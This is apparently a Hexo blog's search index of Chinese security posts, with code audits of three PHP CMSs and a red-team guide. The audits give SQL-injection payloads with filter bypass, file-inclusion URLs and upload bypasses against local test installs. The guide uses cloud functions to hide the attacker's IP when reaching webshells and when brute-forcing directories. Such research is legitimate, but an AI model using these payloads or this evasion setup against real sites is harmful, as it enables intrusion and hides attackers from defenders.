<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Beescms V4.0审计</title>
      <link href="/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/08/11/Beescms%20V4.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="beescms"><a href="#beescms" class="headerlink" title="beescms"></a>beescms</h1><h2 id="前台管理登录界面注入"><a href="#前台管理登录界面注入" class="headerlink" title="前台管理登录界面注入"></a>前台管理登录界面注入</h2><p><a href="http://127.0.0.1/beescms/admin/login.php">http://127.0.0.1/beescms/admin/login.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>()默认仅编码双引号</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">fl_html</span>(<span class="title function_ invoke__">fl_value</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line"><span class="variable">$rel</span>=<span class="variable">$GLOBALS</span>[<span class="string">&#x27;mysql&#x27;</span>]-&gt;<span class="title function_ invoke__">fetch_asc</span>(<span class="string">&quot;select id,admin_name,admin_password,admin_purview,is_disable from &quot;</span>.DB_PRE.<span class="string">&quot;admin where admin_name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; limit 0,1&quot;</span>);</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;爆破库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;and extractvalue(1,concat(0x7e,select database(),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;利用双写+空格绕过过滤<br>&#x2F;&#x2F;爆破表名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect table_name fr from om information_schema.tables wh where ere table_schema like &#x27;</span>beescms<span class="string">&#x27; limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;爆破列名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect column_name fr from om information_schema.columns wh where ere table_name like &#x27;</span>bees_admin<span class="string">&#x27; limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;爆破admin账户名:admin</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(selselectect admin_name fr from om beescms.bees_admin limit 0,1),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;结合substr全部爆破密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,substr((selselectect admin_password fr from om beescms.bees_admin limit 0,1),3,32),0x7e))#</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;21232f297a57a5a743894a0e4a801fc3很明显的md5函数处理：admin</p><h2 id="后台文件上传1"><a href="#后台文件上传1" class="headerlink" title="后台文件上传1"></a>后台文件上传1</h2><p>mime类型绕过<br><a href="http://127.0.0.1/beescms/admin/admin_pic_upload.php">http://127.0.0.1/beescms/admin/admin_pic_upload.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value_arr</span>=<span class="title function_ invoke__">up_img</span>(<span class="variable">$pic_info</span>,<span class="variable">$is_up_size</span>,<span class="keyword">array</span>(<span class="string">&#x27;image/gif&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/jpg&#x27;</span>,<span class="string">&#x27;image/bmp&#x27;</span>,<span class="string">&#x27;image/pjpeg&#x27;</span>,<span class="string">&#x27;image/x-png&#x27;</span>),<span class="variable">$up_is_thumb</span>,<span class="variable">$up_thumb_width</span>,<span class="variable">$up_thumb_height</span>,<span class="variable">$logo</span>=<span class="number">1</span>,<span class="variable">$pic_name_alt</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">up_img</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$size</span>,<span class="variable">$type</span>,<span class="variable">$thumb</span>=<span class="number">0</span>,<span class="variable">$thumb_width</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$thumb_height</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$logo</span>=<span class="number">1</span>,<span class="variable">$pic_alt</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$file_type</span>=<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_type</span>),<span class="variable">$type</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">msg</span>(<span class="string">&#x27;上传图片格式不正确&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只对Content-Type： 进行了对比<br>所以修改Content-Type： 即可进行文件上传绕过<br>Content-Disposition: form-data; name&#x3D;”up[]”; filename&#x3D;”1.php”<br>Content-Type: image&#x2F;png</p><h2 id="后台文件上传2"><a href="#后台文件上传2" class="headerlink" title="后台文件上传2"></a>后台文件上传2</h2><p>同样是mime类型绕过<br>up_img()函数<br><a href="http://127.0.0.1/beescms/admin/upload.php">http://127.0.0.1/beescms/admin/upload.php</a></p><h2 id="后台文件上传3"><a href="#后台文件上传3" class="headerlink" title="后台文件上传3"></a>后台文件上传3</h2><p><a href="http://127.0.0.1/beescms/admin/admin_sys.php">http://127.0.0.1/beescms/admin/admin_sys.php</a><br>修改允许上传文件类型<br>添加一个php类型<br>然后<br><a href="http://127.0.0.1/beescms/admin/admin_file_upload.php">http://127.0.0.1/beescms/admin/admin_file_upload.php</a><br>即可上传php文件</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KKCMS v1.32审计</title>
      <link href="/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/08/11/KKCMS%20v1.32%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="KKCMS-v1-32审计"><a href="#KKCMS-v1-32审计" class="headerlink" title="KKCMS v1.32审计"></a>KKCMS v1.32审计</h1><h2 id="前台注入1"><a href="#前台注入1" class="headerlink" title="前台注入1"></a>前台注入1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/bplay.php?play=a AND (SELECT 6254 FROM (SELECT(SLEEP(5)))hZmf)</span></span><br></pre></td></tr></table></figure><h2 id="前台注入2"><a href="#前台注入2" class="headerlink" title="前台注入2"></a>前台注入2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/ucenter/active.php?verify=a&#x27; AND (SELECT 7219 FROM (SELECT(SLEEP(5)))VMtB) AND &#x27;qLKJ&#x27;=&#x27;qLKJ</span></span><br></pre></td></tr></table></figure><h2 id="未授权添加用户"><a href="#未授权添加用户" class="headerlink" title="未授权添加用户"></a>未授权添加用户</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/kkcms/ucenter/cms_user_add.php</span></span><br></pre></td></tr></table></figure><h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:80/kkcms/admin/cms_ad_edit.php?id=1 AND (SELECT 3894 FROM (SELECT(SLEEP(5)))RJzc)</span></span><br></pre></td></tr></table></figure><p>这套一堆都是重复的注入</p><p>没意思 不写了</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>熊海CMS V1.0审计</title>
      <link href="/2022/08/10/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/08/10/%E7%86%8A%E6%B5%B7CMS%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="熊海CMS-V1-0审计"><a href="#熊海CMS-V1-0审计" class="headerlink" title="熊海CMS V1.0审计"></a>熊海CMS V1.0审计</h1><p>vscode+phpsuty</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><a href="http://127.0.0.1/xhcms/admin/?r=login">http://127.0.0.1/xhcms/admin/?r=login</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin*&amp;password=<span class="number">123456</span>&amp;login=yes</span><br></pre></td></tr></table></figure><h2 id="前台文件包含"><a href="#前台文件包含" class="headerlink" title="前台文件包含"></a>前台文件包含</h2><p><a href="http://127.0.0.1/xhcms/index.php?r=../../phpinfo">http://127.0.0.1/xhcms/index.php?r=../../phpinfo</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//接收文件名</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br></pre></td></tr></table></figure><h2 id="后台文件包含"><a href="#后台文件包含" class="headerlink" title="后台文件包含"></a>后台文件包含</h2><p><a href="http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo">http://127.0.0.1/xhcms/admin/index.php?r=../../../phpinfo</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//接收文件名</span></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$file</span>==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:<span class="variable">$file</span>; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.<span class="variable">$action</span>.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//载入相应文件</span></span><br></pre></td></tr></table></figure><h2 id="前台注入"><a href="#前台注入" class="headerlink" title="前台注入"></a>前台注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=content&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/xhcms/?r=software&amp;cid=1 or updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span></span><br></pre></td></tr></table></figure><p>addslashes 防SQL注入 转义单引号 ‘  &#39;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;UPDATE content SET hit = hit+1 WHERE id=<span class="subst">$id</span>&quot;</span>; <span class="comment">//这里没用到单引号闭合 所以存在SQL注入</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防演练之云函数的利用</title>
      <link href="/2022/08/05/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B9%8B%E4%BA%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/2022/08/05/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B9%8B%E4%BA%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防演练之云函数的利用"><a href="#攻防演练之云函数的利用" class="headerlink" title="攻防演练之云函数的利用"></a>攻防演练之云函数的利用</h1><p>云函数（Serverless CloudFunction，SCF）是云计算厂商为企业和开发者们提供的无服务器执行环境，可在无需购买和管理服务器的情况下运行代码是实时文件处理和数据处理等场景下理想的计算平台。只需使用 SCF平台支持的语言编写核心代码并设置代码运行的条件，即可在某云基础设施上弹性、安全地运行代码。</p><p>由于云函数无法长驻，调用的时候创建，执行完之后立即就销毁，所以无法直接保存状态。也正是这一点，让我们无法代理像 SSH 这种需要长连接的服务，只能代理 HTTP(s) 这种无状态的协议。</p><p>云函数不能直接调用，同时还需要创建一个触发器来触发云函数，为了方便，我们选择使用API 网关触发器，只需要一个 HTTP 请求就能触发。</p><p><strong>腾讯云函数地址：</strong></p><p><a href="https://console.cloud.tencent.com/scf/index">https://console.cloud.tencent.com/scf/index</a></p><p>利用云函数的多出口、无需服务器承载的特性，我们可以在实战攻防演练中实现隐藏自身。</p><p>具体应用如下：</p><h3 id="1、利用云函数API配置蚁剑实现隐藏自身IP连接Webshell"><a href="#1、利用云函数API配置蚁剑实现隐藏自身IP连接Webshell" class="headerlink" title="1、利用云函数API配置蚁剑实现隐藏自身IP连接Webshell"></a>1、<strong>利用云函数API配置蚁剑实现隐藏自身IP连接Webshell</strong></h3><p> 首先创建云函数：</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208011625530.png" alt="image-202208011625530"></p><p><strong>函数代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="comment">#忽略证书校验</span></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    _create_unverified_https_context = ssl._create_unverified_context</span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ssl._create_default_https_context = _create_unverified_https_context</span><br><span class="line">    </span><br><span class="line">user_agent = [<span class="string">&#x27;Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">requests_headers</span>():</span><br><span class="line">    UA = random.choice(user_agent)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: UA,</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;10.10.&#123;&#125;.&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">255</span>)), <span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">255</span>))),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="comment">#url = unquote(event[&#x27;queryString&#x27;][&#x27;url&#x27;])</span></span><br><span class="line">    url = event[<span class="string">&#x27;queryString&#x27;</span>][<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">    agrs = event[<span class="string">&#x27;queryString&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> agrs.keys():</span><br><span class="line">        <span class="keyword">if</span> key != <span class="string">&quot;url&quot;</span>:</span><br><span class="line">            url += <span class="string">&quot;&amp;&quot;</span> +  key + <span class="string">&quot;=&quot;</span> + agrs[key]</span><br><span class="line">    method = event[<span class="string">&#x27;httpMethod&#x27;</span>]</span><br><span class="line">    headers = requests_headers()</span><br><span class="line">    <span class="comment">#headers = event[&#x27;headers&#x27;]</span></span><br><span class="line">    timeout = <span class="number">60</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = event[<span class="string">&#x27;body&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        headers.update(&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;)</span><br><span class="line">        html = requests.post(url=url, headers=headers, timeout=timeout, verify=<span class="literal">False</span>, data=data)</span><br><span class="line">    <span class="keyword">elif</span> method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        html = requests.get(url=url, headers=headers, timeout=timeout, verify=<span class="literal">False</span>, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(html.text))</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: html.status_code,</span><br><span class="line">        <span class="string">&quot;headers&quot;</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;,</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: html.text</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接着在函数管理这里将执行超时时间设置为900秒</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020853243.png" alt="image-20220802085326165"></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020854463.png" alt="image-20220802085338583"></p><p><strong>创建触发器：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020852566.png" alt="image-20220802085206404"></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020852869.png" alt="image-20220802085237776"></p><p>会得到一个访问路径</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020858448.png" alt="image-20220802085845373"></p><p>利用蚁剑进行Webshell连接即可</p><p>路径为：</p><p><a href="https://service-h8ew8bu0-xxxxxxxxxxx.gz.apigw.tencentcs.com/release/xxxxx?url=Webshell%E5%9C%B0%E5%9D%80">https://service-h8ew8bu0-xxxxxxxxxxx.gz.apigw.tencentcs.com/release/xxxxx?url=Webshell地址</a></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208020900807.png" alt="image-20220802090055742"></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021041881.png" alt="image-20220802104133594"></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021041975.png" alt="image-20220802104151793"></p><p>可以看到日志里的ip都是上海的</p><h2 id="2、联动dirsearch多出口爆破目录防BanIP"><a href="#2、联动dirsearch多出口爆破目录防BanIP" class="headerlink" title="2、联动dirsearch多出口爆破目录防BanIP"></a>2、联动dirsearch多出口爆破目录防BanIP</h2><p>首先下载一下SCF-Proxy</p><p>项目地址：<a href="https://github.com/hashsecteam/scf-proxy"><a href="https://github.com/Sakurasan/scf-proxy">GitHub - Sakurasan&#x2F;scf-proxy: 云函数代理服务</a></a></p><p>Go环境下编译一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh build.sh</span><br></pre></td></tr></table></figure><p>获得一个main.zip</p><p>接着在&#x2F;scf-proxy&#x2F;cmd 路径下编译一下 client.go</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build -trimpath client.go</span><br></pre></td></tr></table></figure><p><strong>新建云函数</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021142219.png" alt="image-20220802114215068"></p><p><strong>创建触发器</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021143851.png" alt="image-20220802114341667"></p><p>同样别忘记了设置超时时间900秒</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021144244.png" alt="image-20220802114450106"></p><p>然后客户端设置监听</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./<span class="keyword">client</span> -p <span class="number">8888</span> -scfurl https:<span class="comment">//云函数访问路径</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021152005.png" alt="image-20220802115207900"></p><p>这里就算成功了</p><p>效果测试</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021200131.png" alt="image-20220802120024033"></p><p>使用dirsearch爆破目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://xxxxxxx.com --proxy=http://localhost:8888</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021522846.png" alt="image-20220802152238700"></p><p><strong>效果如下：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021531279.png" alt="image-20220802153139164"></p><p>出口一直在变化</p>]]></content>
      
      
      <categories>
          
          <category> 红队基础设施 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队基础设施 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打点思路</title>
      <link href="/2022/05/17/%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/"/>
      <url>/2022/05/17/%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="内容已加密，请输入密码" />    <label for="pass">内容已加密，请输入密码</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞点位汇总——长期补充</title>
      <link href="/2022/04/27/SSRF%E6%BC%8F%E6%B4%9E%E7%82%B9%E4%BD%8D%E6%B1%87%E6%80%BB%E2%80%94%E2%80%94%E9%95%BF%E6%9C%9F%E8%A1%A5%E5%85%85/"/>
      <url>/2022/04/27/SSRF%E6%BC%8F%E6%B4%9E%E7%82%B9%E4%BD%8D%E6%B1%87%E6%80%BB%E2%80%94%E2%80%94%E9%95%BF%E6%9C%9F%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF漏洞点位汇总——长期补充"><a href="#SSRF漏洞点位汇总——长期补充" class="headerlink" title="SSRF漏洞点位汇总——长期补充"></a>SSRF漏洞点位汇总——长期补充</h1><p>理论上任何带有URL请求的地方都是有可能存在SSRF的。</p><p>这里将各个场景补充一下，方便日后测试。</p><h2 id="1、文章转发点"><a href="#1、文章转发点" class="headerlink" title="1、文章转发点"></a>1、文章转发点</h2><p>转发–&gt;获取url参数数值–&gt;请求该地址–&gt;获取返回信息</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计特殊思路</title>
      <link href="/2022/04/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%89%B9%E6%AE%8A%E6%80%9D%E8%B7%AF/"/>
      <url>/2022/04/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%89%B9%E6%AE%8A%E6%80%9D%E8%B7%AF/</url>
      
